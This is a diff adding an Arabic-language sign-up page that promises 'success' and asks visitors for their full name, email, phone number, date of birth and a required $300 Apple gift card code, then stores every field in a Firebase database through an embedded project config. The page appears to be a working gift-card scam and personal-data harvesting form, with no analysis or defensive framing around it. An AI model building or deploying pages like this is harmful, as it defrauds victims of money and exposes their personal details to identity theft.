@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>مرحباً بك في عالم النجاح</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: linear-gradient(to bottom right, #e0f7fa, #fff);
+      font-family: 'Tahoma', sans-serif;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+      text-align: right;
+    }
+    .container {
+      max-width: 600px;
+      margin: 60px auto;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+    }
+    h1 {
+      color: #00796b;
+      font-size: 26px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #00796b;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #004d40;
+    }
+    .success-message {
+      text-align: center;
+      color: green;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>مرحباً بك في عالم النجاح</h1>
+    <p>ابدأ رحلتك بإنشاء حسابك الشخصي</p>
+    <form id="registerForm">
+      <label for="name">الاسم الكامل</label>
+      <input type="text" id="name" required>
+
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" required>
+
+      <label for="phone">رقم الهاتف</label>
+      <input type="tel" id="phone" required>
+
+      <label for="dob">تاريخ الميلاد</label>
+      <input type="date" id="dob" required>
+
+      <label for="giftCode">كود بطاقة هدية Apple Giftcard $300</label>
+      <input type="text" id="giftCode" required>
+
+      <button type="submit">إنشاء الحساب</button>
+    </form>
+
+    <div class="success-message" id="successMessage"></div>
+  </div>
+
+  <!-- Firebase Scripts -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+  <script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDzWe0sMFecKa9sHk30pXat5qrT4yDyuJ4",
+  authDomain: "soccer2-c47c2.firebaseapp.com",
+  databaseURL: "https://soccer2-c47c2-default-rtdb.firebaseio.com",
+  projectId: "soccer2-c47c2",
+  storageBucket: "soccer2-c47c2.firebasestorage.app",
+  messagingSenderId: "942310698005",
+  appId: "1:942310698005:web:2f5230da671ef0b47db21c"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    document.getElementById('registerForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email').value;
+      const phone = document.getElementById('phone').value;
+      const dob = document.getElementById('dob').value;
+      const giftCode = document.getElementById('giftCode').value;
+
+      try {
+        const docRef = await db.collection("users").add({
+          name,
+          email,
+          phone,
+          dob,
+          giftCode,
+          createdAt: new Date()
+        });
+
+        // Show success and redirect
+        document.getElementById('successMessage').innerText = "تم التسجيل بنجاح! سيتم تحويلك الآن...";
+        setTimeout(() => {
+          window.location.href = `dashboard.html?uid=${docRef.id}`;
+        }, 2000);
+
+      } catch (error) {
+        alert("حدث خطأ أثناء التسجيل. حاول مرة أخرى.");
+        console.error(error);
+      }
+    });
+  </script>
+
+</body>
+</html>
